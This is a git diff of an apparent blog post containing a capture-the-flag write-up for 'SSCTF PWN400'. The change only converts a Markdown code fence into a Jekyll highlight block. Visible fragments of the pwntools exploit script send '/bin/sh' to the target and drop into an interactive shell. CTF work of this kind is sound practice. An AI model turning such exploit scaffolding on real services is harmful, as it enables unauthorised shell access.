@@ -5,8 +5,7 @@ title: SSCTF PWN400
 <h2>{{ page.title }}</h2>
 <p>最后剩5分钟才分配任意地址，最后写完了</p>
 <p>{{ page.date | date_to_string }}</p>
-
-```python
+{% highlight python lineno %}
 from pwn import *
 import sys
 import re
@@ -227,4 +226,4 @@ io.send('/bin/sh' + '\n')
 
 io.interactive()
 
-```
+{% endhighlight %}
